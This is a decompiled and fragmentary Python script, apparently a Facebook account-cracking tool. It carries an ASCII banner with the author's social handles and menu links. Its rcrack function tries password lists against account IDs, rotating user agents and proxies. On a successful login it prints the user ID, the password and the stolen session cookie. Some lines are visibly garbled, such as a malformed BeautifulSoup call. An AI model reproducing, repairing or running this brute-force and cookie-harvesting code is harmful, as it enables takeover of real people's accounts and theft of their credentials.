# Decompile bny KangEhem:)
# with (uncompyle6) version : 3.7.0
# Time Succes decompile : 2022-10-03 04:04:30.100111
import os
import sys
import time
import requests
...
\x1b[1;93m-------┠───────────────────────────────╂───────────────────────────┫
\x1b[1;94m-------│❲◍❳ ɢɪᴛʜᴜʙ   : Qeen 𓁋.       │● ᴛʜᴇ ᴋɪɴɢ ᴏғғ ᴘʀᴏɢʀᴀᴍᴍᴇʀ ●│
\x1b[1;95m-------┠───────────────────────────────╂─────────────┯─────────────┫
\x1b[1;96m-------│❲◍❳ ғᴀᴄᴇʙᴏᴏᴋ : QUEEN│● ● ● ┏──────┷──────┓     ●
\x1b[1;97m-------┠───────────────────────────────┫
\x1b[1;95m-------│❲◍❳ ᴡʜᴀᴛsᴀᴘᴘ : nadarom| ● ● ● ┗─────────────┛   ● 
\x1b[1;91m-------┠───────────────────────────────┷───────┯───────────────────┫
\x1b[1;92m-------│❲◍❳ ᴛᴇʟᴇɢʀᴀᴍ : KNDQUEEN             │● ᴛʜᴀɴᴋs ᴇᴠᴇʀʏᴏɴᴇ ●│
\x1b[1;93m-------┗───────────────────────────────────────┷───────────────────┛
...
def ud():
    os.system('clear')
    jalan(logo)
    print(' [1] SUBSCRIBE MY TELEGRAM CHANNEL ')
    print(' [2] EXIT')
    opt = input('\n   Choose option >>> ')
    if opt == '1':
...
def FD():
    ...
    if opt == '1':
        os.system('xdg-open https://www.facebook.com/mobin.shahab.5')
        o()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')
def o():
...
def cek_apk(session,coki):
    ...
    sop = BeautifulSoup(w,"html.parserx = sop.find("form",method="post")
...
def rcrack(uid,pwx,tl):
    ...
    global proxy
    try:
        for ps in pwx:pro = random.choice(ugen)
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(QUEEN-OK)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r     %s[HEMAT] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
